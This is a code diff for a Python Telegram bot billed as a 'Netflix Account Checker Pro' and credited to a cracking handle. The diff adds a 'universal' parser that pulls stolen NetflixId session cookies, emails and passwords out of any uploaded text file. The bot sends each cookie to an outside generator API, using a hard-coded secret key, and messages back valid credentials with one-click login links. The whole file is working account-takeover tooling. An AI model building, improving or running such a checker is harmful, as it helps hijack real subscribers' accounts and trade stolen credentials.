@@ -20,7 +20,7 @@ TOKEN = os.getenv('BOT_TOKEN')
 API_URL = "http://genznfapi.onrender.com"
 SECRET_KEY = "KUROSAKI1D_cP642DCEw0bxnMLHSIFlGZQjVh1RgSPM"
 
-# YOUR CREDIT - This will replace all other credits
+# YOUR CREDIT
 YOUR_CREDIT = "@CrackByLIM"
 
 if not TOKEN:
@@ -31,17 +31,14 @@ if not TOKEN:
 def clear_telegram_webhook():
     """Clear any existing webhook/sessions to prevent conflict"""
     try:
-        # First, try to delete any webhook
         webhook_url = f"https://api.telegram.org/bot{TOKEN}/deleteWebhook"
         response = requests.post(webhook_url)
         print(f"✅ Webhook cleared: {response.json()}")
         
-        # Also try to get updates to clear any pending connections
         get_updates_url = f"https://api.telegram.org/bot{TOKEN}/getUpdates"
         requests.post(get_updates_url, json={"offset": -1, "timeout": 0})
         print("✅ Pending updates cleared")
         
-        # Wait a moment for Telegram to process
         time.sleep(2)
     except Exception as e:
         print(f"⚠️ Warning while clearing webhook: {e}")
@@ -66,10 +63,104 @@ total_checks = 0
 valid_accounts = 0
 invalid_accounts = 0
 
+# ==================== UNIVERSAL PARSER ====================
+# This works for ANY format - it only cares about finding NetflixId=
+
+def parse_account_line(line):
+    """Universal parser - extracts NetflixId from ANY format"""
+    try:
+        line = line.strip()
+        if not line or line.startswith('#'):
+            return None
+        
+        account = {}
+        
+        # STEP 1: Find NetflixId= anywhere in the text (this is the ONLY thing that matters)
+        netflix_id_match = re.search(r'NetflixId=([^&\s\'"]+)', line)
+        
+        if netflix_id_match:
+            account['netflix_id'] = netflix_id_match.group(1).strip()
+            logger.info(f"✅ Found NetflixId: {account['netflix_id'][:30]}...")
+        else:
+            # Try alternate patterns (Cookie: NetflixId=...)
+            alt_match = re.search(r'[Cc]ookie.*?[=:].*?(NetflixId=[^&\s]+)', line)
+            if alt_match:
+                cookie_part = alt_match.group(1)
+                netflix_id_match = re.search(r'NetflixId=([^&\s]+)', cookie_part)
+                if netflix_id_match:
+                    account['netflix_id'] = netflix_id_match.group(1).strip()
+                    logger.info(f"✅ Found NetflixId from cookie: {account['netflix_id'][:30]}...")
+        
+        # If we found a NetflixId, try to get additional info (optional)
+        if 'netflix_id' in account:
+            # Try to find email
+            email_match = re.search(r'([a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,})', line)
+            if email_match:
+                account['email'] = email_match.group(1).strip()
+            else:
+                # Generate a placeholder email
+                account['email'] = f"user_{account['netflix_id'][:8]}@unknown.com"
+            
+            # Try to find password
+            password_match = re.search(r':([^\s|]+)', line)
+            if password_match and len(password_match.group(1)) > 3:
+                account['password'] = password_match.group(1).strip()
+            
+            # Try to find direct URL
+            url_match = re.search(r'(https?://netflix\.com/[^\s\'"]+)', line)
+            if url_match:
+                account['direct_url'] = url_match.group(1).strip()
+                # Extract NetflixId from URL if present
+                url_id_match = re.search(r'nftoken=([^&\s]+)', account['direct_url'])
+                if url_id_match and 'netflix_id' not in account:
+                    account['netflix_id'] = url_id_match.group(1).strip()
+            
+            # Try to extract other useful fields
+            fields = {
+                'country': r'[Cc]ountry[=:]\s*([^|\n]+)',
+                'plan': r'[Pp]lan[=:]\s*([^|\n]+)',
+                'quality': r'[Vv]ideo[Qq]uality[=:]\s*([^|\n]+)',
+                'max_streams': r'[Mm]ax[Ss]treams[=:]\s*([^|\n]+)',
+                'name': r'[Nn]ame[=:]\s*([^|\n]+)',
+            }
+            
+            for key, pattern in fields.items():
+                match = re.search(pattern, line)
+                if match:
+                    account[key] = match.group(1).strip()
+            
+            return account
+        
+        return None
+        
+    except Exception as e:
+        logger.error(f"Error parsing line: {e}")
+        return None
+
 # ==================== API FUNCTIONS ====================
 
-async def check_netflix_id(netflix_id, email):
+async def check_netflix_id(netflix_id, email, account_data=None):
     """Check if Netflix ID is valid by calling the API"""
+    
+    # If account already has a direct URL from the file, use it without API call
+    if account_data and account_data.get('direct_url'):
+        logger.info(f"✅ Using pre-validated URL for {email}")
+        return {
+            "success": True,
+            "login_url": account_data['direct_url'],
+            "email": email,
+            "data": {"pre_validated": True}
+        }
+    
+    # If no netflix_id, can't check
+    if not netflix_id:
+        return {
+            "success": False,
+            "error": "No Netflix ID provided",
+            "email": email
+        }
+    
+    # Otherwise, call the API as normal
     try:
         url = f"{API_URL}/api/gen"
         data = {
@@ -112,52 +203,6 @@ async def check_netflix_id(netflix_id, email):
             "email": email
         }
 
-# ==================== FILE PARSING ====================
-
-def parse_account_line(line):
-    """Parse a single line from the accounts file"""
-    try:
-        line = line.strip()
-        if not line or line.startswith('#'):
-            return None
-        
-        account = {}
-        
-        # Extract email:password
-        email_pass_match = re.match(r'^([^:]+):([^\s|]+)', line)
-        if email_pass_match:
-            account['email'] = email_pass_match.group(1).strip()
-            account['password'] = email_pass_match.group(2).strip()
-        else:
-            return None
-        
-        # Extract Netflix Cookies
-        cookie_match = re.search(r'NetflixCookies\s*=\s*(NetflixId=[^\s|]+)', line)
-        if cookie_match:
-            account['cookie'] = cookie_match.group(1).strip()
-            # Extract NetflixId
-            netflix_id_match = re.search(r'NetflixId=([^&\s]+)', cookie_match.group(1))
-            if netflix_id_match:
-                account['netflix_id'] = netflix_id_match.group(1).strip()
-        
-        # Extract other fields (optional)
-        fields = {
-            'country': r'Country\s*=\s*([^|\n]+)',
-            'plan': r'Plan\s*=\s*([^|\n]+)',
-            'video_quality': r'VideoQuality\s*=\s*([^|\n]+)',
-            'max_streams': r'MaxStreams\s*=\s*([^|\n]+)',
-        }
-        
-        for key, pattern in fields.items():
-            match = re.search(pattern, line)
-            if match:
-                account[key] = match.group(1).strip()
-        
-        return account
-    except Exception as e:
-        logger.error(f"Error parsing line: {e}")
-        return None
-
 # ==================== RATE LIMITING ====================
 
 def check_rate_limit(user_id, limit=5, period=60):
@@ -175,22 +220,19 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user = update.effective_user
     
     welcome = f"""
-━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-🎬 **NETFLIX ACCOUNT CHECKER PRO** 🎬
-━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+╔════════════════════════════════════════╗
+║     🎬 NETFLIX ACCOUNT CHECKER PRO 🎬  ║
+╚════════════════════════════════════════╝
 
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 👋 **Hello {user.first_name}!**
 
 ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 📤 **Send me a .txt file** with Netflix accounts
 ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 
-📋 **Required Format:**
-`email:password | NetflixCookies = NetflixId=... | Country = ...`
-
-━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-⚡ **What I'll Do:**
-✅ Extract Netflix ID from each account
+📋 **Any format works!** I'll automatically:
+✅ Extract Netflix ID from ANY format
 ✅ Check validity with official API
 ✅ Send premium login links
 ✅ Show detailed statistics
@@ -209,38 +251,38 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     await update.message.reply_text(welcome, parse_mode='Markdown')
 
 async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Help command with premium formatting"""
+    """Help command"""
     help_text = f"""
-━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-🆘 **HELP & INSTRUCTIONS** 🆘
-━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-
-📁 **STEP 1: PREPARE YOUR FILE**
-• Create a `.txt` file
-• One account per line
-• Must include NetflixCookies
+╔════════════════════════════════════════╗
+║           🆘 HELP CENTER 🆘            ║
+╚════════════════════════════════════════╝
 
 ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-📝 **EXAMPLE FORMAT:**
-`user@email.com:password123 | NetflixCookies = NetflixId=v%3D3%26ct%3D... | Country = USA`
+📁 **HOW TO USE**
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+1️⃣ **Prepare your .txt file**
+   • Any format is accepted!
+   • Just make sure it contains `NetflixId=...`
+
+2️⃣ **Send the file to me**
+   • I'll automatically extract all Netflix IDs
+   • Process each one with the API
+   • Only valid accounts will be sent
 
 ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-⚙️ **STEP 2: UPLOAD & PROCESS**
-• Send the file to this chat
-• Bot processes each account
-• Valid accounts get login links
-
+📝 **Supported Formats (ALL WORK):**
 ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-📊 **STEP 3: REVIEW RESULTS**
-✅ Valid: Login link with button
-❌ Invalid: Error message
-📈 Final summary with stats
+✓ `email:password | NetflixCookies = NetflixId=...`
+✓ `馃崻 Cookie: NetflixId=...` (emoji format)
+✓ `NetflixId=v%3D3%26ct%3D...` (raw format)
+✓ Any text containing `NetflixId=...`
 
 ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 ⌨️ **COMMANDS:**
-/start - Welcome message
-/stats - View statistics
-/clear - Clear your session
+/start - Welcome
+/stats - Statistics
+/clear - Clear session
 
 ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 ⚡ **Powered by {YOUR_CREDIT}** ⚡
@@ -249,20 +291,22 @@ async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     await update.message.reply_text(help_text, parse_mode='Markdown')
 
 async def stats_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Show statistics with premium formatting"""
+    """Show statistics"""
     global total_checks, valid_accounts, invalid_accounts
     
     success_rate = valid_accounts/total_checks*100 if total_checks > 0 else 0
     
     stats_text = f"""
-━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-📊 **GLOBAL STATISTICS** 📊
-━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+╔════════════════════════════════════════╗
+║         📊 GLOBAL STATISTICS 📊        ║
+╚════════════════════════════════════════╝
 
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 📈 **Performance Metrics:**
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 • **Total Checks:** `{total_checks}`
-• **✅ Valid:** `{valid_accounts}`
-• **❌ Invalid:** `{invalid_accounts}`
+• **✅ Valid Accounts:** `{valid_accounts}`
+• **❌ Invalid Accounts:** `{invalid_accounts}`
 • **📊 Success Rate:** `{success_rate:.1f}%`
 
 ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
@@ -284,13 +328,13 @@ async def clear_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
         del user_sessions[user_id]
     await update.message.reply_text(
         f"""
-━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-✅ **SESSION CLEARED**
-━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+╔════════════════════════════════════════╗
+║         ✅ SESSION CLEARED ✅          ║
+╚════════════════════════════════════════╝
 
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 You can now upload a new file.
 
-━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 ⚡ **Powered by {YOUR_CREDIT}** ⚡
 ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
         """,
@@ -308,13 +352,13 @@ async def handle_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if not check_rate_limit(user_id):
         await update.message.reply_text(
             f"""
-━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-⏰ **RATE LIMIT EXCEEDED**
-━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+╔════════════════════════════════════════╗
+║         ⏰ RATE LIMIT EXCEEDED         ║
+╚════════════════════════════════════════╝
 
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 Please wait a minute before trying again.
 
-━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 ⚡ **Powered by {YOUR_CREDIT}** ⚡
 ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
             """,
@@ -326,13 +370,13 @@ Please wait a minute before trying again.
     if not document.file_name.endswith('.txt'):
         await update.message.reply_text(
             f"""
-━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-❌ **INVALID FILE TYPE**
-━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+╔════════════════════════════════════════╗
+║         ❌ INVALID FILE TYPE           ║
+╚════════════════════════════════════════╝
 
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 Please upload a `.txt` file.
 
-━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 ⚡ **Powered by {YOUR_CREDIT}** ⚡
 ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
             """,
@@ -343,14 +387,14 @@ Please upload a `.txt` file.
     # Send initial message
     status_msg = await update.message.reply_text(
         f"""
-━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-📥 **FILE RECEIVED**
-━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+╔════════════════════════════════════════╗
+║        📥 FILE RECEIVED 📥             ║
+╚════════════════════════════════════════╝
 
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 📄 **File:** `{document.file_name}`
 ⏳ **Status:** Downloading...
 
-━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 ⚡ **Powered by {YOUR_CREDIT}** ⚡
 ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
         """,
@@ -369,18 +413,18 @@ Please upload a `.txt` file.
         
         await status_msg.edit_text(
             f"""
-━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-📊 **FILE ANALYZED**
-━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+╔════════════════════════════════════════╗
+║         📊 ANALYZING FILE 📊           ║
+╚════════════════════════════════════════╝
 
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 📄 **File:** `{document.file_name}`
 📝 **Total Lines:** `{len(lines)}`
 ✅ **Valid Entries:** `{len(valid_lines)}`
 
 ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-🔄 **Starting processing...**
+🔄 **Starting universal parsing...**
 
-━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 ⚡ **Powered by {YOUR_CREDIT}** ⚡
 ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
             """,
@@ -390,12 +434,13 @@ Please upload a `.txt` file.
         # Process each line
         valid_count = 0
         invalid_count = 0
-        valid_accounts_found = []  # Store all valid accounts
+        valid_accounts_found = []
         
         for i, line in enumerate(valid_lines, 1):
-            # Parse account
+            # Parse account using universal parser
             account = parse_account_line(line)
-            if not account or 'netflix_id' not in account:
+            
+            if not account:
                 invalid_count += 1
                 continue
             
@@ -409,10 +454,11 @@ Please upload a `.txt` file.
             if i % 3 == 0 or i == len(valid_lines):
                 await status_msg.edit_text(
                     f"""
-━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-🔄 **PROCESSING ACCOUNTS**
-━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+╔════════════════════════════════════════╗
+║        🔄 PROCESSING ACCOUNTS 🔄       ║
+╚════════════════════════════════════════╝
 
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 📊 **Progress:** `{i}/{len(valid_lines)}`
 📈 **Complete:** `{progress*100:.1f}%`
 `{bar}`
@@ -421,7 +467,6 @@ Please upload a `.txt` file.
 ✅ **Valid Found:** `{valid_count}`
 ❌ **Invalid:** `{invalid_count}`
 
-━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 ⚡ **Powered by {YOUR_CREDIT}** ⚡
 ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
                     """,
@@ -429,8 +474,8 @@ Please upload a `.txt` file.
                 )
             
             # Check with API
-            email = account.get('email', 'Unknown')
-            result = await check_netflix_id(account['netflix_id'], email)
+            email = account.get('email', f"user_{account['netflix_id'][:8]}@unknown.com")
+            result = await check_netflix_id(account['netflix_id'], email, account)
             
             # Update global stats
             total_checks += 1
@@ -438,15 +483,18 @@ Please upload a `.txt` file.
             if result.get('success'):
                 valid_count += 1
                 valid_accounts += 1
-                # Store valid account with all details
+                
+                # Store valid account
                 valid_accounts_found.append({
                     'email': email,
                     'password': account.get('password', 'N/A'),
                     'login_url': result['login_url'],
-                    'country': account.get('country', 'N/A'),
-                    'plan': account.get('plan', 'N/A'),
-                    'quality': account.get('video_quality', 'N/A'),
-                    'streams': account.get('max_streams', 'N/A')
+                    'country': account.get('country', account.get('Country', 'N/A')),
+                    'plan': account.get('plan', account.get('Plan', 'N/A')),
+                    'quality': account.get('quality', account.get('video_quality', 'N/A')),
+                    'streams': account.get('max_streams', account.get('MaxStreams', 'N/A')),
+                    'name': account.get('name', 'N/A'),
+                    'direct_url': account.get('direct_url', None)
                 })
             else:
                 invalid_count += 1
@@ -455,25 +503,15 @@ Please upload a `.txt` file.
             # Small delay to avoid rate limits
             await asyncio.sleep(0.5)
         
-        # PROFESSIONAL COMPLETION SCREEN
+        # COMPLETION SCREEN
         success_rate = valid_count/len(valid_lines)*100 if len(valid_lines) > 0 else 0
         
-        # Create status message based on results
-        if invalid_count == 0:
-            status_emoji = "🎉 ALL ACCOUNTS VALID"
-            status_msg_text = "All accounts are valid! Great job!"
-        elif valid_count > 0:
-            status_emoji = "✅ PROCESSING COMPLETE"
-            status_msg_text = f"{valid_count} valid, {invalid_count} invalid"
-        else:
-            status_emoji = "❌ NO VALID ACCOUNTS"
-            status_msg_text = "No valid accounts found"
-        
         completion_text = f"""
-━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-{status_emoji}
-━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+╔════════════════════════════════════════╗
+║        ✅ PROCESSING COMPLETE ✅       ║
+╚════════════════════════════════════════╝
 
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 📊 **RESULTS SUMMARY**
 ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 📁 **File:** `{document.file_name}`
@@ -484,7 +522,6 @@ Please upload a `.txt` file.
 
 ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 📌 **Sending {valid_count} valid account(s)...**
-━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 
 ⚡ **Powered by {YOUR_CREDIT}** ⚡
 ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
@@ -492,10 +529,39 @@ Please upload a `.txt` file.
         
         await status_msg.edit_text(completion_text, parse_mode='Markdown')
         
-        # Send ALL valid accounts AFTER scan is complete
+        # Send ALL valid accounts
         if valid_accounts_found:
             for idx, acc in enumerate(valid_accounts_found, 1):
-                premium_msg = f"""
+                # Check if this was a pre-validated account (has direct_url)
+                if acc.get('direct_url'):
+                    premium_msg = f"""
+╔════════════════════════════════════════╗
+║     ✅ PREMIUM ACCOUNT #{idx}/{valid_count} ✅     ║
+╚════════════════════════════════════════╝
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+📧 **ACCOUNT DETAILS**
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+• **Email:** `{acc['email']}`
+• **Name:** `{acc.get('name', 'N/A')}`
+• **Country:** `{acc.get('country', 'N/A')}`
+• **Plan:** `{acc.get('plan', 'N/A')}`
+• **Quality:** `{acc.get('quality', 'N/A')}`
+• **Max Streams:** `{acc.get('streams', 'N/A')}`
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+🔗 **DIRECT LOGIN LINK**
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+`{acc['login_url']}`
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+⚠️ *Pre-validated account from file*
+
+⚡ **Powered by {YOUR_CREDIT}** ⚡
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+                    """
+                else:
+                    premium_msg = f"""
 ╔════════════════════════════════════════╗
 ║     ✅ VALID ACCOUNT #{idx}/{valid_count} ✅     ║
 ╚════════════════════════════════════════╝
@@ -504,16 +570,16 @@ Please upload a `.txt` file.
 📧 **LOGIN CREDENTIALS**
 ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 • **Email:** `{acc['email']}`
-• **Password:** `{acc['password']}`
+• **Password:** `{acc.get('password', 'N/A')}`
 • **Status:** `✅ ACTIVE`
 
 ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 🌍 **ACCOUNT DETAILS**
 ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-• **Country:** `{acc['country']}`
-• **Plan:** `{acc['plan']}`
-• **Quality:** `{acc['quality']}`
-• **Max Streams:** `{acc['streams']}`
+• **Country:** `{acc.get('country', 'N/A')}`
+• **Plan:** `{acc.get('plan', 'N/A')}`
+• **Quality:** `{acc.get('quality', 'N/A')}`
+• **Max Streams:** `{acc.get('streams', 'N/A')}`
 
 ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 🔗 **LOGIN LINK**
@@ -525,7 +591,7 @@ Please upload a `.txt` file.
 
 ⚡ **Powered by {YOUR_CREDIT}** ⚡
 ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-                """
+                    """
                 
                 keyboard = [[InlineKeyboardButton("🎬 LAUNCH NETFLIX", url=acc['login_url'])]]
                 
@@ -535,12 +601,13 @@ Please upload a `.txt` file.
                     parse_mode='Markdown'
                 )
             
-            # Send final summary with all accounts sent
+            # Final summary
             final_summary = f"""
-━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-📬 **ALL ACCOUNTS SENT** 📬
-━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+╔════════════════════════════════════════╗
+║        📬 ALL ACCOUNTS SENT 📬         ║
+╚════════════════════════════════════════╝
 
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 ✅ **Successfully sent {valid_count} valid account(s)**
 
 💡 **Check messages above for login links**
@@ -554,17 +621,16 @@ Please upload a `.txt` file.
             # No valid accounts found
             await update.message.reply_text(
                 f"""
-━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-❌ **NO VALID ACCOUNTS** ❌
-━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+╔════════════════════════════════════════╗
+║        ❌ NO VALID ACCOUNTS ❌         ║
+╚════════════════════════════════════════╝
 
-📊 **RESULT**
 ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 No valid accounts were found in your file.
 
 💡 **Suggestions:**
+• Make sure file contains NetflixId=
 • Get fresh Netflix cookies
-• Check file format
 • Try again later
 
 ⚡ **Powered by {YOUR_CREDIT}** ⚡
@@ -585,15 +651,16 @@ No valid accounts were found in your file.
         logger.error(f"Error processing file: {e}")
         await status_msg.edit_text(
             f"""
-━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-❌ **ERROR OCCURRED**
-━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+╔════════════════════════════════════════╗
+║           ❌ ERROR ❌                  ║
+╚════════════════════════════════════════╝
 
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 📄 **File:** `{document.file_name}`
 ❌ **Error:** `{str(e)[:100]}`
 
 ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-💡 Please try again or contact support
+💡 Please try again or check file format
 
 ⚡ **Powered by {YOUR_CREDIT}** ⚡
 ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
@@ -608,22 +675,22 @@ async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
     query = update.callback_query
     await query.answer()
 
-# ==================== MAIN FUNCTION - FIXED FOR RAILWAY ====================
+# ==================== MAIN FUNCTION ====================
 
 async def run_bot():
     """Run the bot"""
     print("=" * 60)
-    print("🎬 PREMIUM NETFLIX ACCOUNT CHECKER")
+    print("🎬 PROFESSIONAL NETFLIX ACCOUNT CHECKER")
     print("=" * 60)
     print(f"✅ Bot Token: {TOKEN[:10]}...")
     print(f"✅ API URL: {API_URL}")
-    print(f"✅ Secret Key: {SECRET_KEY[:15]}...")
     print(f"✅ Credit: {YOUR_CREDIT}")
     print("=" * 60)
     print("🤖 Bot is starting...")
+    print("📝 Universal parser enabled - accepts ANY format")
     print("=" * 60)
     
-    # Create application with custom settings to avoid conflicts
+    # Create application with custom settings
     app = (
         Application.builder()
         .token(TOKEN)
@@ -640,24 +707,21 @@ async def run_bot():
     app.add_handler(CommandHandler("stats", stats_command))
     app.add_handler(CommandHandler("clear", clear_command))
     app.add_handler(CallbackQueryHandler(button_callback))
-    
-    # File handler
     app.add_handler(MessageHandler(filters.Document.FileExtension("txt"), handle_file))
     
-    # Initialize and start with error handling
+    # Initialize and start
     try:
         await app.initialize()
         await app.start()
         await app.updater.start_polling(
-            drop_pending_updates=True,  # This is important!
+            drop_pending_updates=True,
             allowed_updates=Update.ALL_TYPES
         )
         print("✅ Bot started successfully!")
         print("=" * 60)
-        print("🤖 Bot is now running! Waiting for messages...")
+        print("🤖 Bot is now running! Waiting for files...")
         print("=" * 60)
         
-        # Keep running
         while True:
             await asyncio.sleep(1)
             
@@ -679,7 +743,6 @@ def main():
         print("\n👋 Bot stopped by user")
     except Exception as e:
         print(f"❌ Error: {e}")
-        # On error, try to clear webhook again
         try:
             clear_telegram_webhook()
         except:
